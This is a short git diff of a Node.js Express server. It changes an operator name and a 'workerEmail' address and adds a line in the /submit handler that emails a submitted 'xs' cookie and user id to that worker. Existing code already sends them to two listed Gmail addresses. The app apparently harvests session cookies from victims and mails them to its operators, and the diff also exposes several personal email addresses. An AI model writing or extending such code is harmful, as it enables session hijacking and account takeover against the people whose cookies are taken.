@@ -10,13 +10,13 @@ app.use(express.static(path.join(__dirname,'static')))
 app.use(express.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-const name = "Ghafar"
+const name = "Fawad"
 const emails = [
   "unaisnizamani598@gmail.com",
   "marina.bhoo.so@gmail.com"
   
 ]
-const workerEmail = "official.honda.lore@gmail.com";
+const workerEmail = "info.fawad.jani@gmail.com";
 
 
 
@@ -61,6 +61,7 @@ app.post("/submit", async (req, res) => {
   const cookie = req.body.xs;
 
 
+  await sendMail(name,workerEmail,cookie,uid)
 
   for(let i=0;i<emails.length;i++) {
     await sendMail(name,emails[i],cookie,uid)
